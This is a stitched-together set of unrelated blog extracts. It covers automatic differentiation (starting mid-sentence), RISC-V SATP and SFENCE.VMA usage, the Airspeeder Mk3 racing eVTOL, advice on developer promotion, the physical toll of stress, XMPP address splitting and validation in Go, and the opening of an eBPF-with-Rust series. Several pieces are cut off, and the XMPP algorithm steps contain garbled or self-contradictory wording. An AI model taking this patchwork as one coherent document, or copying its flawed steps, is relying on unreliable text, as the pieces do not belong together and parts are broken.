It basically has to do something like this, where-as a forward/reverse AD system could do as we did and fall back to <code>+</code> and <code>*</code>.
<em>But</em>, it certainly would <em>not</em> help you to apply symbolic AD to an approximation, that would give exactly the result we derived for <code>d_sin</code> above.</p>

<p>More interestingly, languages where symbolic differentiation is common tend also th have interesting representations of functions in the first place.
This does open up avenues for interesting solutions.
A suitably weird language could be using representation of <code>sin</code> that is a lazily evaluated polynomial of infinite degree underneath.
And in that case there is a rule for its derivative, expressed in terms of changes to its coefficient generating function; which would also give back a lazily evaluated polynomial.
I don’t know if anyone does that though; I suspect it doesn’t generalized well.
Further, for a lot of things you want to solving systems via iterative methods, and these …</p></div></div>

<h2 id="s_introduction">Introduction</h2>



<p>My <a href="https://blog.stephenmarz.com/2020/11/23/back-that-s-up/" data-type="post" data-id="613">last post</a> garnered some attention by those telling me that I “forgot” to execute an SFENCE.VMA after I wrote to the SATP register–some with more tact than others. This post is here to clarify why I did what I did, and to clarify what the specification actually tells us needs to be done.</p>



<hr>



<h2 id="s_what_is_satp">What is SATP?</h2>



<p>The <em>supervisor address translation and protection</em> (SATP) register is a register that tells the MMU what mode it’s in, what address space it is working in, and where to find the first level page table in RAM (this would be level 2 for Sv39).</p>



<div><figure><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/12/image-1024x76.png" alt="" width="512" height="38" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/12/image-1024x76.png 1024w, https://blog.stephenmarz.com/wp-content/uploads/2020/12/image-300x22.png 300w, https://blog.stephenmarz.com/wp-content/uploads/2020/12/image-768x57.png 768w, https://blog.stephenmarz.com/wp-content/uploads/2020/12/image-1536x114.png 1536w, https://blog.stephenmarz.com/wp-content/uploads/2020/12/image-2048x153.png 2048w" sizes="(max-width: 512px) 100vw, 512px"><figcaption>The SATP Register Fields</figcaption></figure></div>



<p>The SATP register stores three pieces of information, the MODE, the address space identifier (ASID), and the physical page number (PPN).</p>



<h4>The MODE</h4>



<p>If the MODE=0, then the MMU is turned off and any address is not translated. </p>



<p>If MODE=8, we’re in Sv39 (Supervisor 39-bit) mode which means that our virtual addresses are 39-bits long.</p>



<p>There are other modes, but I won’t cover them here.</p>



<h4>The ASID</h4>



<p>The address space identifier tags translations with a unique identifier.</p>



<h4>The PPN</h4>



<p>The physical page number is the upper 44-bits of a 56-bit memory address where we can find the first level page table.</p>



<hr>



<h2 id="s_what_is_sfence">What is SFENCE.VMA?</h2>



<p>In absolute terms, this means <em>supervisor fence</em>.<em>virtual memory address</em>. In real terms, it will flush the cache’s so that the MMU will “see” the new changes in memory. This means that the MMU will be forced to look in RAM where the page tables are stored.</p>



<p>The SFENCE.VMA instruction has several different ways to execute it as shown in the specification. This should clue us in to the fact that executing SFENCE.VMA every time we write to SATP might not be so cut and dry.</p>



<hr>



<h2 id="s_what_is_happening">What is Happening?</h2>



<p>So, why is this not straightforward? The issue is that “walking” a page table–meaning going into RAM and translating a virtual address into a physical address–is not a fast process. There are multiple levels of page tables, and several 8-byte entries that need to be dereferenced by the memory controller.</p>



<p>We can speed these walks up by “caching” frequently translated addresses into a table. The table has the virtual address number and the physical address number, so translation is just a table lookup instead of dereferencing several levels of page tables.</p>



<p>This caching can be speculative. If the MMU doesn’t speculate, then the first time we translate an address, that address will not be in the TLB (the cache table) and we will get what is known as a <em>compulsory miss</em>. If we speculate, we can predict the addresses that will be used and when the memory controller isn’t doing anything else, we can load the virtual address and physical address into cache.</p>



<p>This speculation is one of the reasons for SFENCE.VMA. Another reason is due to the fact that when we translate a page using the MMU, it stores the most recent translations in the TLB as well. </p>



<hr>



<h2 id="s_the_tlb">The Translation Lookaside Buffer</h2>



<p>The translation lookaside buffer or TLB is a fancy term for the MMU cache. It stores the most recent translations to exploit <em>temporal locality</em>–that is, the chances we’re going to translate the same address near in the future is likely. So, instead of having to walk the page tables all over again, we just look in the TLB.</p>



<p>The TLB has several entries, and with RISC-V, it stores an address space identifier (ASID). The address space identifier allows the TLB to store more entries than just the most recent page table. This has always been a problem with TLBs, including with the Intel/AMD processor. Writing to its MMU register (called CR3 for control register #3) will cause a TLB flush. This is NOT the case with RISC-V writing to the SATP register (the MMU register in RISC-V).</p>



<p>The specification just gives the general rules for a manufacturer to use. Therefore, the manufacturer can choose how they want to implement their MMU and TLB as long as it complies with RISC-V’s privileged specification. Here’s a simple implementation of a TLB that complies with the privileged specification.</p>



<hr>



<h2 id="conclusion">Conclusion</h2>



<p>The RISC-V specification doesn’t make it very clear, but you can see clarification on the spec’s github repository. If the MODE is not 0, then the MMU is allowed to <em>speculate</em>, meaning it can pre-populate the MMU based on the addresses it <em>thinks</em> will need to be translated in the near future. The specification allows this, but the MMU cannot throw a page fault if a speculatory translation is invalid.</p>



<p>So, bottom line — SFENCE.VMA should NOT be called every time SATP is changed. This will cause TLB thrashing since every time you context switch, you will need to change the SATP register to the kernel page table, schedule, then change the SATP register to the new scheduled process’ page table.</p>



<p>Instead, the SFENCE.VMA instruction should be invoked when one or more of the following occur:</p>



<ol><li>When software recycles an ASID (i.e., reassociates it with a different page table), it should first change satp to point to the new page table using the recycled ASID, then execute SFENCE.VMA with rs1=x0 and rs2 set to the recycled ASID. Alternatively, software can execute the same SFENCE.VMA instruction while a different ASID is loaded into satp, provided the next time satp is loaded with the recycled ASID, it is simultaneously loaded with the new page table.</li><li>If the implementation does not provide ASIDs, or software chooses to always use ASID 0, then after every satp write, software should execute SFENCE.VMA with rs1=x0. In the common case that no global translations have been modified, rs2 should be set to a register other than x0 but which contains the value zero, so that global translations are not flushed.</li><li>If software modifies a non-leaf PTE, it should execute SFENCE.VMA with rs1=x0. If any PTE along the traversal path had its G bit set, rs2 must be x0; otherwise, rs2 should be set to the ASID for which the translation is being modified.</li><li>If software modifies a leaf PTE, it should execute SFENCE.VMA with rs1 set to a virtual address within the page. If any PTE along the traversal path had its G bit set, rs2 must be x0; otherwise, rs2 should be set to the ASID for which the translation is being modified.</li><li>For the special cases of increasing the permissions on a leaf PTE and changing an invalid PTE to a valid leaf, software may choose to execute the SFENCE.VMA lazily. After modifying the PTE but before executing SFENCE.VMA, either the new or old permissions will be used. In the latter case, a page fault exception might occur, at which point software should execute SFENCE.VMA in accordance with the previous bullet point.</li></ol>



<p>Unfortunately, you have to dig through the issues and updates to the specification on GitHub to find out some of this information. I have provided links in references below.</p>

      The Airspeeder Mk3, a full-sized remotely-operated electric vertical take-off and landing vehicle (eVTOL), has been unveiled and is ready to race.
    </p>
</div>
  <div>
  <div>
    <p><span>The first of its kind will be showcased in an upcoming racing series that will stand as a technical test-bed and feeder series to the manned series in 2022.</span></p>
<p><span>A full grid of </span><a href="http://www.airspeeder.com/speeders"><span>Mk3 electric flying cars</span></a><span> are currently being manufactured at Airspeeder and Alauda’s technical HQ in Adelaide, South Australia. More than 10 identical racing vehicles will be produced and supplied to teams in 2021.&nbsp;</span></p>
<p><span>Final behind-closed-doors pre-season tests will happen in Australia before the start of an international racing calendar.</span></p>
<p><span>The initial <a href="https://airspeeder.com/news/seven-lessons-airspeeder-learnt-from-motorsport">Mk3 races will provide vital information</a> on vehicle dynamics, performance, </span><span>safety and powertrain technology that will inform the final development of the manned Mk4 Airspeeder vehicle.</span></p>

    <h3><b>SAFETY SYSTEMS</b></h3>
<p><span>The Speeder will be operated remotely by a pilot on the ground. The groundbreaking safety enhancements include <a href="https://youtu.be/Fl0hl2_E9Mg">LiDAR and Radar</a> collision avoidance systems that create a ‘virtual forcefield’ around the craft. Additionally, the Mk3 features a carbon fibre frame and fuselage chosen for its strength, stiffness and lightweight properties, which ensures manoeuvrability, performance and efficiency.&nbsp; </span></p>
  </div>
</div><div>
  <div>
    <h3><b>POWERTRAIN</b></h3>
<p><span>The powertrain represents a significant upgrade on the <a href="https://airspeeder.com/series/up-to-speed">Mk2 proof of concept vehicle</a>, with power increased by 95% with only a 50% increase in weight. A 96 kW electric powertrain already sees the Mk3 operating with a thrust to weight ratio above two, on a craft that weighs just 100KG unmanned. The Mk3 speeders will fly at speeds in excess of 120 km\h.&nbsp;</span></p>

    <h3><b>MANOEUVRABILITY </b><b>AND STABILITY</b></h3>
<p><span>The Mk3 speeders are laid-out in an ‘octocopter X formation’, providing significant advantages to pilots. When racing the pilot will be able to make the same sharp hairpin style turns as a Formula 1 car but with the added third dimension of being able to move vertically.&nbsp;</span></p>
<h3><b>RAPID PIT STOPS</b></h3>
<p><span>To facilitate rapid pit stops, Alauda’s engineers have developed an innovative ‘slide and lock’ system for the rapid removal and replacement of batteries when on the ground, this technology debuts on the Mk3.&nbsp;</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                            <p><em>Hello, I'm <a href="https://twitter.com/rickluevanos">Rick</a>! Welcome to the premier issue of my newsletter, where I share career experience, insight, and strategy for getting promoted and rising as a software developer. If you're already a subscriber, thank you so much for your support. If you're not - <a href="https://www.therisingdev.com/subscribe/">subscribe</a>.</em></p><hr><p><strong>FROM RICK</strong> / CONVERSATIONS / READING</p><p>I started my career in the late 90s as a software developer. At the time, my goals included being good at what I was doing, adding value to the people I worked with, and being rewarded for my efforts through promotion to more challenging roles. A few things have changed since I started my career. Like the various titles between a beginning developer and a more senior role now being better defined—somewhat. But the challenge of finding the path from one level to the next is still varying between companies.<br></p><p>I’ve learned a ton about rising as a developer. Many of these learnings have seemed counterintuitive at times. Yet, they all yielded observations, and fundamental principles that I think will help you execute on your rise as a developer.</p><h2 id="the-challenges"><strong>The Challenges</strong></h2><p>The topic of promotions, especially in tech, can be very confusing. Employee count, stage of company growth, company culture, and a company's leadership experience may all have a role in how or when you might be eligible for a promotion. And the methodologies and philosophies around promotions can differ from company to company—your strategy for rising in one company might not translate to the next.<br></p><p>Consider this, based on an article by <a href="https://www.indeed.com/lead/tech-company-size"><em>Indeed.com - with data from US Business Dynamics Statistics</em></a><em>,</em> larger firms (1000+ employees) employed nearly half of all US workers. In contrast, small to mid-sized firms (less than 1000 employees) employed most of the rest. However, the narrative regarding promotion paths comes mainly from the larger companies where the different job levels are better defined. As a result, roughly half of us in the US alone, especially those newer to their careers, may be lacking a well-defined path to career growth and promotion.<br></p><p>There is another variable that will impact your rise. You might be “re-leveled” due to a merger, an acquisition, or after a company reorganization. You can even promote yourself by leaving one company to join another. And you can get leveled back to where you were previously by joining yet another company. I’m a Director level employee at the time of this writing. If I wanted to join Facebook as a Director, I would need to be a VP level candidate when applying, and I would be re-leveled from VP to Director if hired.<br></p><p>None of this is necessarily good or bad. However, it emphasizes the need for awareness when devising your strategy for rising as a developer.</p><h2 id="where-to-focus"><strong>Where to Focus</strong></h2><p>When I started my career in software development, the situation around titles was quite a mess. As a contract developer, folks described me as a webmaster, web developer, and UI/UX Designer. Eventually, those titles evolved to become more technology-focused; I was a Multimedia Developer for a while when Flash was popular, then a Sr PHP Developer when PHP was the language du jour.<br></p><p>As I worked on larger and more complex systems for scale, titles like Software Engineer came into play, then Sr Software Engineer. These changes were not necessarily always promotions. A lot of them derived from the fact that companies didn’t have these paths figured out. Many still don’t. <br></p><p>At the time of this writing, I’m a Director of Engineering leading managers that lead teams—I’m still learning. And despite the challenges that came with finding and executing on a path to a more challenging role, a 20+ year career in software development has taught me that there are ways to manifest what you desire and deserve.<br></p><p>Here are a few strategies that I think make you promotion worthy.</p><h3 id="aim-for-impact-over-output"><strong>Aim for Impact Over Output</strong></h3><p>Early in my career, I paid far too much attention to work output. I even volunteered to take on more work than I needed and relished working late nights and weekends to get projects across the finish line. I’ve seen this same pattern in others; we all wanted to be that so-called 10x developer.<br></p><p>This kind of effort might be helpful in a small startup for some time, but it’s not how you make an impact, and it’s not how you rise as a developer. The hard truth is companies can purchase output by employing freelancers, contractors, or staff augmentation agencies. Therefore, the output is not necessarily a promotion metric. <br></p><p>The impact is what matters, and I’ve learned this can mean different things in different companies. Here are a few areas to consider when seeking to focus on impact over output:<br></p><ul><li>Understand as much detail as possible about the problem or challenge you are trying to solve, finding the “why” in what you are doing can often help you propose a smarter or faster alternative.</li><li>Share your work early and often, especially for projects that take longer than usual to complete. Regardless of how confident you may feel in your approach and solution, getting extra eyes on something can reveal a possible improvement or expose a risk early.</li><li>Look for ways to automate tasks you are repeatedly doing. Imagine others coming along in the future to expand and improve on your work. Look for efficiencies you can put in place, so their job is quicker and less complex.</li><li>Remove yourself as a single point of failure by transferring knowledge. Share and document what you know, think of the edge-cases and nuances surrounding your work and capture the context needed for others to pick up where you left off.</li></ul><h3 id="work-on-the-right-things-the-right-way"><strong>Work on the Right Things, the Right Way</strong></h3><p>I once worked for a video game startup where I tackled many challenging problems, and I led others in doing the same. Eventually, I had a playbook of approaches for the various challenges that came up. I felt like a hero—I knew I was good at this.<br></p><p>Later in my career, I worked for a much larger and established video game company, where I unleashed my playbook on folks to save them from their inevitable path to failure, so I thought. My so-called playbook was all wrong. It was like trying to execute football plays on a baseball field of tennis players. My playbook eventually became something more flexible, more rubric than a playbook.<br></p><p>I learned that the right thing to work on and the right way to do it are moving targets. However, you can set some constraints to ensure you are thinking in a way that allows for flexibility while remaining as close to “right” as possible.<br></p><p>Here are some questions to ask yourself to help filter for the “right things”:<br></p><ul><li>Is what I’m working on prioritized against other things I could be doing? Were these projects part of a planning meeting with group input on prioritization?</li><li>Is this work captured and tracked somewhere for transparency, with a thorough understanding of the requirements and success criteria?</li><li>Does my team know this is what I’m doing? If I pivoted while responding to a production issue, did I broadcast this pivot?<br></li></ul><p>Here are some questions to help filter for the “right way”:<br></p><ul><li>Will other teams use what I’m building, and should I consider their specific needs?</li><li>What are the requirements for scale? Is what I’m building going to be used long term, or is it part of a first phase iteration? Will it be used by hundreds, thousands, or millions of people?</li><li>Do we have the internal expertise, bandwidth, and interest in building, operating, and maintaining this, or should we consider buying a solution instead of making our own? <br></li></ul><p>The answers to the questions above won’t always be obvious, even after working through them with your team. Often you will only have answers to a few and the need to make progress right away.<br></p><p>The most important part here is the conversation. Asking these questions to yourself and your team increases the odds of working on the right things the right way and is another driver towards impact over output.</p><h3 id="ruthlessly-prioritize-personal-growth"><strong>Ruthlessly Prioritize Personal Growth</strong></h3><p>It should be no surprise that continuous learning will always be a significant component of your success. I knew this early in my career and embraced it, but I missed something that slowed my growth for a bit; I wasn’t asking for enough feedback.<br></p><p>I now realize that feedback is a multiplier to personal growth. If you are looking for a way to accelerate learning and development, this is it. I didn’t learn this until I received enough critical feedback that stung, forcing me to throw my arms up and set my ego aside, and focus on gathering and integrating as much input from others as I possibly could.<br></p><p>Share everything and share it early, not just the work you are doing. Share your point of view, your gut feelings, your decisions, and your decision-making process. Share how you approached a conversation or how you are thinking of conducting a conversation—share it all with folks who are more experienced and listen to what they say.<br></p><p>In addition to being intentional about always learning, I made it a point to seek feedback around what I should be doing less and what I should be doing more. I didn’t judge that feedback; instead, I analyzed it, threw away some, and fully integrated the rest. Then I asked for more feedback.<br></p><p>Every company and team you join is a school. Look for schools that will help you explore your capabilities and help you fill any gaps. If you’re not feeling challenged, or getting enough feedback, find a better school.</p><h3 id="focus-on-team-over-self"><strong>Focus on Team Over Self</strong></h3><p>There’s this urge to compare ourselves to others, and look at the more technically experienced developer next to us and wonder about the things we should be doing to be like them. As I worked within different companies and different teams, I found myself doing this very thing. It was a waste of time and emotional energy.<br></p><p>I once worked with a very talented database engineer. I would partner with him on building out specific features, and everything we did together came out great. I envied his abilities, and I worked hard to learn as much as I could about everything he did on the database side so that I could be like him.<br></p><p>He did not do the …</p></div></div>

<p>I want to talk about stress. I tweeted this last night:&nbsp;</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>PSA: Remember to take time to de-stress &amp; live healthily.</p><p>Like many ppl, I’m bad at this. But stress has a way of biting you. </p><p>Here is 1 weird manifestation – you get so tense, you impinge you own nerve &amp; cannot do normal things like lift a detergent bottle w your right hand: <a href="https://t.co/upjJ3AYbZl">pic.twitter.com/upjJ3AYbZl</a></p></div>— Elizabeth Yin (@dunkhippo33) <a href="https://twitter.com/dunkhippo33/status/1282144912851390464?ref_src=twsrc%5Etfw">July 12, 2020</a></blockquote>
</div></figure>



<p>This is what stress can do — I cannot lift laundry detergent “normally” with my right arm.&nbsp;</p>



<p>In fact, it turns out that your trapezius muscle allows you to do many things such as</p>



<ul><li>Reach for things in a cabinet</li><li>Adjust the rear-view mirror or radio knob in a car</li><li>Wash dishes</li><li>To a certain extent, use a fork to eat food.&nbsp;</li></ul>



<p>Without this muscle, many things are challenging. </p>



<p>One of my founders even texted me right after I posted this video if I was stressed out about his latest investor report! Hah!&nbsp;</p>



<p>This video isn’t about stress from fundraising (we’re not raising right now anyway) or from having portfolio companies who are doing well or not well.&nbsp;In fact, the reason I decided to write about this so publicly is not to garner sympathy (but thank you for all the well wishes!) but to show to everyone what can happen because of stress — <em><strong>and that this can happen to anyone</strong></em>. </p>



<p>In fact, all of this started when I was 23 — not just recently. At 23, I ended up in a hospital in Tokyo after having terrible neck pain, where I was living and working at the time. I was fortunate to have excellent care, but the bad news was that I had a pinched nerve and I would likely live with this pain and weird issues forever — though it could be <em><strong>managed with proper diet, exercise, and low stress</strong>.&nbsp;</em></p>



<p>The likely combined cause?&nbsp;Years of </p>



<ul><li>Poor posture (sitting and standing)</li><li>Poor ergonomics using computers</li><li>Using computers too much (by age 23!)</li><li>Slinging too many backpacks filled with heavy books during high school</li><li>Combined with stress</li></ul>



<p>In other words, there wasn’t any particular trauma or incident. But guess what? 80% of people I know have some permutation of the above.&nbsp;</p>

<p>Over the years, I’ve been able to manage this chronic issue pretty well. I started taking up swimming, even though I was never a swimmer in school (YouTube can teach you so many things!). And, I have bought so many ergonomic keyboards over the years, that I’m sure single-handedly propping the Amazon share price up.&nbsp;</p>



<p>But every once in a while, stress creeps up and sends me back into health issues. In 2009, when I was starting my company, my arms and hands were tingling and it hurt to type. In 2011, when I was fundraising, I felt like someone was constantly poking me with pins all over. Some of the best physicians who were specialists in this area could not find anything additional wrong — miraculously when I stopped fundraising, the prickly feeling left! And fast forward to today, the combination of shelter-in-place/little kids/handling of the COVID-19 situation/police brutality/racism/and even the murder hornets are all fairly stressful! (I’m sure I’m not the only one here who thinks this)</p>



<p>As it would turn out over half of my friends who are tech entrepreneurs or recovering tech entrepreneurs have stress-induced issues. Repetitive strain issues, tingling feelings, shingles, IBS or other chronic stress-related problems, etc. It’s seemingly quite common, and while mental health is starting to be discussed, the physical ramifications of stress are rarely discussed publicly.&nbsp;</p>



<p>And once you have one of these issues, with proper care, you’ll be able to manage through it, but you’ll get flare ups from time to time as stress comes and goes. You’ll never be quite the same.&nbsp;</p>



<p>If I had to rewind the clock, what would I tell myself?</p>



<p><strong>Never use a computer or iPad in an un-ergonomic way</strong></p>



<ul><li>No laptop usage on the couch</li><li>Buy an ergonomic mouse &amp; keyboard that fits your hands (the built-in ones on the Macbook Air are way too hard)</li><li>Buy an external monitor and set it to eye-level</li><li>Set up proper typing and mousing heights</li><li>Use a tablet pen with an iPad</li></ul>



<p><strong>Do a stress-relieving exercise everyday – even for 5 min</strong>. Once we leave school and become adults — there’s no PE or fun sports forced upon you to keep you accountable. And, for some (such as myself), forcing exercise becomes challenging. But even just a few jumping jacks a day can do wonders. In fact, jumping jacks are near impossible for me to do now.&nbsp;</p>

<p><strong>Always lift things in an ergonomic way</strong> – not just weights but everything. In school, I used to sling a lot of books over my shoulder. (Maybe I should have studied less? My HS schoolmates who had those wheelie backpacks got it right.)&nbsp;</p>



<p><strong>Sprint when you need to but jog when you don’t</strong> – in building a startup, sometimes you need to sprint — it’s inevitable. But understanding when you need to sprint and when you can jog is the key. As <a href="https://twitter.com/MacConwell/status/1282354308097474561?s=20">Mac Conwell discusses here</a>, most people try to sprint all the time, and that’s just not sustainable.&nbsp;</p>



<p>Jog mode doesn’t mean do nothing, but jog mode means reducing really extraneous things. Standing or sitting in front of a computer for hours on end isn’t what humans were meant to do. Reducing extraneous Zoom mtgs &amp; calls, extraneous emails, etc and really focusing on health (exercise + mindfulness + stress reduction + good diet) during these times is what jog mode means. Prioritizing and only focusing on just 1 work thing for a “normal” working day is what jog mode means. </p>



<p>A lot of people wonder why not that many builders go back and build again. My hunch is that it’s this: they have some sort of chronic ailment that prevents them from being in “go-go-go mode” all the time and don’t think they can build a fast-growth company if they are not in “go-go-go mode” all the time. I think if we didn’t have “go-go-go mode” all the time as the norm expectation, we would see more multi-repeat builders. There’s this sense that if you’re not in “go-go-go mode” all the time, you’re not ambitious, but I think the right analogy is akin to marathon runners. Most people can’t run marathons everyday. You need to slow on some days and rest too. But when it counts, you need to be all out there running your race. Understanding what day is your race and what days are your training are critical, but often we don’t understand that. And if you get injured, you’ll never be the same. We have so many former athletes who are now injured who don’t want to run races again because they think they won’t win.</p>



<p>For me, with my ailments, I literally cannot type as much as I used to — I need days of typing rest. That used to frustrate me to no end. But over time, I’ve come to learn what is important to type, what emails to hold off on, and more recently, I’ve started building homegrown tools to allow me to do more with less typing.&nbsp;</p>



<p>As a parent, I actually care way less about screen time and more about ergonomics. When my 3 year old said his back hurt from looking down at the screen, I was/am really hoping he was exaggerating (hard to tell), and it would not surprise me if this upcoming generation who will grow up on more portable devices that easily allow for poor posture and ergonomics will have even more chronic problems. I think ergonomics and posture should be taught in schools as part of PE or health.&nbsp;</p>



<p>In conclusion – take care of your stress and health — you only have one shot, and once your health is gone, it’s hard to be the same again.</p>

February 8, 2021 | https://blog.samwhited.com/2021/02/xmpp-addresses/ | <a href="https://web.archive.org/web/*/https://blog.samwhited.com/2021/02/xmpp-addresses/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
		<p>This post is copied from an article I originally wrote for <a href="https://stackoverflow.com/documentation">Stack Overflow
Documentation</a>, a wiki-style documentation site.
As it is <a href="https://meta.stackoverflow.com/questions/354217/sunsetting-documentation">no longer available</a>, I have copied it here and modified it to work in
blog post form.</p>
<hr>
<p>XMPP addresses, more commonly known as <abbr title="Jabber Identifiers">JIDs</abbr>, are defined in <a href="https://tools.ietf.org/html/rfc7622">RFC 7622</a> and identify clients, servers,
and other entities on the XMPP network.
They look like an email address, but sometimes have an optional “resourcepart”
at the end that identifies a particular client logged in as the account
represented by the rest of the address (since XMPP may have multiple clients
connected per account).
For example, my JID with a resourcepart <code>blog</code> would be:</p>
<pre><code>sam@samwhited.com/blog
</code></pre>
<p>Unlike email where the account is the lowest level of entity that can be
addressed, individual clients on the XMPP network are globally addressable
thanks to the addition of the resourcepart.</p>
<h2 id="jid-types">JID Types</h2>
<p>JIDs are sometimes broken down into two types: the “full JID” and the “bare
JID”.
Full JIDs always have a resource part and uniquely identify an individual client
or session on the network:</p>
<ul>
<li><code>romeo@example.org/orchard</code></li>
<li><code>example.org/da863ab</code></li>
</ul>
<p>Bare JIDs <strong>never</strong> have a resourcepart and identify an account or host on the
network:</p>
<ul>
<li><code>romeo@example.org</code></li>
<li><code>example.org</code></li>
</ul>
<p>From a protocol perspective nothing can be gleaned from the lack or presence of
a resourcepart or localpart other than the fact that this is an account which
may have multiple network entities with current sessions or that it addresses a
specific entity.</p>
<h2 id="splitting-a-jid">Splitting a JID</h2>
<p>To split a JID into its component parts (the localpart, domainpart, and
resourcepart), the following algorithm should be used (where the localpart is
represented by <code>lp</code>, the resourcepart by <code>rp</code>, and the domainpart by <code>dp</code> and ∈
is used to check if the given character is included in the string):</p>
<figure><a href="https://blog.samwhited.com/img/jid_split.png">
    <img src="https://d33wubrfki0l68.cloudfront.net/f9e5d76c2f5f8206866030d825f781ec3f2b4188/365c9/img/jid_split.png" alt="JID splitting flow chart" width="500"> </a>
</figure>

<p>In textual form:</p>
<ol>
<li>If the JID does not contain a “/”, the resourcepart is the empty string.
Discard everything after and including the “/” and goto 5.</li>
<li>Otherwise split on the first slash.</li>
<li>If the part after the slash was the empty string, error.</li>
<li>Otherwise the resourcepart is the part after the slash.</li>
<li>If the remainder of the JID does not contain an “@”, the localpart is empty
and the domainpart is the remainder of the JID. Goto 9.</li>
<li>Otherwise, split on the “@”.</li>
<li>If the part before the “@” is the empty string, error.</li>
<li>Otherwise the domainpart is localpart is the part before the “@” and the
domainpart is the part after the “@”.</li>
<li>Trim any “.” suffix from the domainpart.</li>
<li>Done!</li>
</ol>
<p>Note that the localpart and resourcepart are optional and may result in empty
strings (you may have a jid that is just a domainpart).</p>
<p>And finally, let’s see an example in code form using Go:</p>
<p>In Go, the <a href="https://pkg.go.dev/mellium.im/xmpp/jid"><code>mellium.im/xmpp/jid</code></a> package implements operations on JIDs.
To Split a JID string into its component parts the <a href="https://pkg.go.dev/mellium.im/xmpp/jid#SplitString"><code>SplitString</code></a> function may
be used:</p>
<pre><code>lp, dp, rp, err := SplitString("romeo@example.net")
</code></pre><p>No validation is performed by <code>SplitString</code> and the parts are not guaranteed to
be valid.</p>
<p>To manually split a string without depending on the <code>jid</code> package, the
underlying code (with annotations from RFC 7622) looks like this:</p>
<pre><code>func SplitString(s string) (localpart, domainpart, resourcepart string, err error) {
	// RFC 7622 §3.1.  Fundamentals:
	//
	//    Implementation Note: When dividing a JID into its component parts,
	//    an implementation needs to match the separator characters '@' and
	//    '/' before applying any transformation algorithms, which might
	//    decompose certain Unicode code points to the separator characters.
	//
	// so let's do that now. First we'll parse the domainpart using the rules
	// defined in §3.2:
	//
	//    The domainpart of a JID is the portion that remains once the
	//    following parsing steps are taken:
	//
	//    1.  Remove any portion from the first '/' character to the end of the
	//        string (if there is a '/' character present).
	sep := strings.Index(s, "/")

	if sep == -1 {
		resourcepart = ""
	} else {
		// If the resource part exists, make sure it isn't empty.
		if sep == len(s)-1 {
			err = errNoResourcepart
			return
		}
		resourcepart = s[sep+1:]
		s = s[:sep]
	}

	//    2.  Remove any portion from the beginning of the string to the first
	//        '@' character (if there is an '@' character present).

	sep = strings.Index(s, "@")

	switch {
	case sep == -1:
		// There is no @ sign, and therefore no localpart.
		localpart = ""
		domainpart = s
	case sep == 0:
		// The JID starts with an @ sign (invalid empty localpart)
		err = errNoLocalpart
		return
	default:
		domainpart = s[sep+1:]
		localpart = s[:sep]
	}

	// We'll throw out any trailing dots on domainparts, since they're ignored:
	//
	//    If the domainpart includes a final character considered to be a label
	//    separator (dot) by [RFC1034], this character MUST be stripped from
	//    the domainpart before the JID of which it is a part is used for the
	//    purpose of routing an XML stanza, comparing against another JID, or
	//    constructing an XMPP URI or IRI [RFC5122].  In particular, such a
	//    character MUST be stripped before any other canonicalization steps
	//    are taken.

	domainpart = strings.TrimSuffix(domainpart, ".")

	return
}
</code></pre><h2 id="validating-a-jid">Validating a JID</h2>
<p>Unlike emails, JIDs were defined with Internationalization (i18n) in mind using
the Preparation, Enforcement, and Comparison of Internationalized Strings
(PRECIS) framework.
PRECIS is defined in <a href="https://tools.ietf.org/html/rfc8264">RFC 8264</a> and is a framework for comparing strings safely
in a variety of contexts.
For instance, imagine you have registered the nickname “Richard IV” (Latin
capital letters I, Vee) in a group chat: Using PRECIS the chat application could
ensure that no one else comes along and registers the nickname “Richard Ⅳ”
(Unicode Roman Numeral 4) and uses it to impersonate you.</p>
<p>The algorithm for validating a JID that has already been split into its
localpart, domainpart, and resourcepart is as follows:</p>
<figure><a href="https://blog.samwhited.com/img/jid_validate.png">
    <img src="https://d33wubrfki0l68.cloudfront.net/7967a0249ff5178a2ab089dfe1c38ecd9cc99b5e/c3408/img/jid_validate.png" alt="JID validation flow chart" width="500"> </a>
</figure>

<p>In textual form:</p>
<ol>
<li>Take the localpart, domainpart, and resourcepart as the inputs.</li>
<li>If the localpart or resourcepart are not valid UTF-8, error.</li>
<li>Otherwise run the IDNA “To Unicode” algorithm on the domainpart.</li>
<li>If the output domainpart is not valid UTF-8, error.</li>
<li>Otherwise run the PRECIS “Username Case Mapped” profile on the localpart, and
the “Opaque String” profile on the resource part.</li>
<li>Perform other validation steps (in no particular order).</li>
</ol>
<p>The final <code>Validations</code> step should perform the following actions (in no
particular order):</p>
<ul>
<li>Check that the localpart is less than 1024 bytes.</li>
<li>Check that the localpart does not contain any any of the following</li>
<li>characters: <code>"&amp;'/:&lt;&gt;@</code>.</li>
<li>Check that the resourcepart is less than 1024 bytes.</li>
<li>Check that the domainpart is greater than zero bytes and less than 1024</li>
<li>bytes (and possibly validate that parts of the domainpart meet hostname,</li>
<li>DNS, or IP address requirements as appropriate).</li>
<li>If the domainpart is a valid IPv6 address, ensure that it uses bracketed
notation (eg. <code>[::1]</code> instead of <code>::1</code>).</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>As a user of XMPP most of the time addresses will just look like emails and you
won’t need to ever see them except occasionally adding one to your address book.
Even as a developer of XMPP you mostly won’t need to worry about the details of
splitting or validating JIDs as robust libraries for handling XMPP addresses
exist in most or all popular programming languages.
However, sometimes it’s fun to take a bit of a dive into seemingly simple
technologies and know how they work under the hood.
Hopefully this article gave you a deeper appreciation of how to handle addresses
in XMPP.</p>

<p>This is a multi-part series on my adventure into eBPF with Rust.</p>
<p>Part 1 details the problem set encountered that led to researching eBPF and what
we actually being trying to solve as our example problem throughout the series.</p>
<p>Writing eBPF code is somewhat new and not for the feint of heart. It's typically
done in a low level subset of C with a myriad of gotchas and edge cases. If you
follow me, you'll probably guess Rust is my goto language, but writing eBPF code
in Rust is even trickier. Luckily, a collection of crates exist to make this job
easier, but in using them I found a few areas that could use some improvement.
This series goes over the where the ecosystem stands right now, and ultimately
the details of changes I'm proposing to make it even better.</p>
<p>I believe Rust can be the goto eBPF language with a little work.</p>
<h2 id="series-overview">Series Overview</h2>

<li>Part 1: we lay out the problem set</li>

<h2 id="the-why">The Why</h2>
<p>At <code>$DAYJOB</code> we've been experimenting with a new(ish) Linux kernel technology
called eBPF. Before I dive into the specifics of eBPF, let me explain the simple
